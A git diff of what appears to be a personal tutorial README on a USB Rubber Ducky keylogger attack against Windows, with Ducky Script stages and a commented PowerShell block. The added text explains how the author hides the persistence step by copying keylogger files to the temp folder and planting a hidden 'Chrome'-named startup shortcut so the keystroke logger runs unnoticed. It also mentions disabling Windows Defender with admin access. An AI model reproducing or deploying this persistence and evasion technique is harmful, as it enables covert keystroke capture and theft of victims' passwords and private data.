@@ -124,13 +124,13 @@ powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/l.ps1"
 Here @echo off just means when the cmd is opened you wont see the powershell commands actually typed although they will still happen. The two commands just start each of the files in succession first p.ps1 (keylogger) and then l.ps1 (keylogger schedule). In the origional attack by CosmodiumCS the c.cmd file is placed in the windows start folder so every time windows starts it wil run which will in turn run the keylogger and the scheduler allowing this attack to be persistant. Just to note i am dumbfounded that windows allows ANYTHING to be placed in this folder without admin privlages. Which is just a huge security risk. However if you look at your startup applications in task manager you will see it listed which i think makes it pretty obvious c.cmd shouldnt be there.
 
 <p align="center">
-  <img src="https://github.com/svecile/BadUSB_Notes/blob/main/startup.png" alt="startup" width="800"/>
+  <img src="https://github.com/svecile/BadUSB_Notes/blob/main/startup.png" alt="startup" width="600"/>
 </p>
 
-So because of that i tried modififying this attack in two ways. The first way was just making the c.cmd file hidden which works well since it no longer shows up in the start programs of task manager. However if you have show hidden files on like i do you can still see it kinda greyed out in the startup folder so i thought i would disguise it in a cooler way which i will explain in the part about the ducky script. 
+So because of that i tried modififying this attack in two ways. The first way was just making the c.cmd file hidden which works well since it no longer shows up in the start programs of task manager. However, if you have show hidden files turned on like i do you can still see it kinda greyed out in the startup folder so i thought i would disguise it in a cooler way which i will explain in the next part about the ducky script. 
 
 ### Ducky Script
-Ducky script is a very simple language that has been devloped specifically for the usb rubber ducky and is how you tell it what you want it to type. [Here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) you can find a cheat sheet on the ducky script syntax but ill give a quick overview of the most important parts before i show you the script for the windows keylogger attack. 
+Ducky script is a very simple language that has been devloped specifically for the usb rubber ducky and is how you tell the usb what you want it to type. This script is just written in a simple text file and then is encoded by the ducky encoder into something the usb can read. The ducky encoder can be downloaded [here](https://downloads.hak5.org/api/devices/usbrubberducky/tools/jsencoder/1.0) and this will give you a file called "inject.bin" which is what you would copy to your usb rubber ducky. [Here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) you can find a cheat sheet on the ducky script syntax but ill give a quick overview of the most important parts before i show you the script for the windows keylogger attack. 
 - REM is the command you put infront of comments
 - DELAY is the command you use to pause the program, which is important while you wait for things to load since this usb types extreamly fast. Also the numbers after delay are in milliseconds so 1000ms = 1sec
 - GUI is the command that tells it to hold the windows key
@@ -158,3 +158,48 @@ REM STAGE 3 run keylogger
 STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\Chrome.lnk;exit
 ENTER
 ```
+This script works as follows:
+Stage 1 
+1. You can first see it delay 5 seconds this is so the computer has time to install the keyboard drivers
+2. It then presses GUI (windows key) + r to open the run dialog 
+3. It waits 200ms for the run box to open
+3. It types the string "powershell" and presses enter to open a powershell terminal (non-admin)
+    - I did find a way to open powershell as an admin to do more damage to the system like disabling windows defender and stuff but its not needed for the basic keylogger so i'm going to keep it simple for this demo. 
+4. It then delays 200ms to wait for the powershell window to open before it starts typing
+
+Stage 2
+This is where you see the speed typing prowes of the usb rubber ducky as it types out an entire powershell program in a second. The program moves the files p.ps1, l.ps1 and c.cmd to where they need to go and it does this by typing that big string into the powershell terminal which is basically just a powershell program squished into one string. Here is where i modified the attack. Origionally the the script would copy c.cmd into the start folder and l.ps1 and p.ps1 into the temp folder but that lead to the c.cmd being visible in the startup section of task manager. Instead i made all three files hidden and moved them into the temp folder. I then use powershell to  create a hidden shortcut to c.cmd, named it chrome and gave it the chrome icon. I placed this shortcut in the startup folder so now if you have viewing hidden files on it looks just like google chrome is in the startup folder. This is not uncommon and i dont think a user would think twice about this. The fact that the shortcut is hidden also means that nothing showes up in task manager's startup items. Another bonus is now that i am using a shortcut to launch the cmd i can specify that the window should be started in minimized mode. So when the script runs at startup a cmd window wont pop up momentarially, instead youll just see a flash of the cmd icon on the task bar which is almost unnoticable. These steps just further allow our attack to avoid detection. Below you can see the powershell string in readable code format with comments so it's easier to understand.
+
+```
+REM this line just selects the usb device's name which is "L"
+$u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;
+
+REM this changes us into the usb's directory
+cd $u.name;
+
+REM this coppies p.ps1, l.ps1, c.cmd and the chrome icon file into the windows temp folder (could have been any folder but this is just easy)
+cp .\p.ps1 $env:temp;
+cp .\l.ps1 $env:temp;
+cp .\c.cmd $env:temp;
+cp .\ChromeIcon.ico $env:temp;
+
+REM this creates a new shortcut called "Chrome"
+$WScriptObj = New-Object -ComObject ("WScript.Shell");
+$shortcut = $WscriptObj.CreateShortcut("C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/StartMenu/Programs/Startup/Chrome.lnk");
+
+REM this sets the newly created shortcut to point to c.cmd
+$shortcut.TargetPath = "$env:temp\c.cmd";
+
+REM this sets the icon of the shortcut to the chrome logo to help it hide in plain sight
+$Shortcut.IconLocation = "$env:temp\ChromeIcon.ico, 0";
+
+REM this saves the shortcut
+$shortcut.Save();
+
+REM this changes into the temp folder and creates the log file that will log the users keystrokes
+cd $env:temp;
+echo "">"$env:UserName.log";
+```
+
+Stage 3
+This stage just changed into the startup folder and runs the shortcut to c.cmd starting the keylogger. It then exits and cleans up and at this point you can remove the usb and the attack is finished.
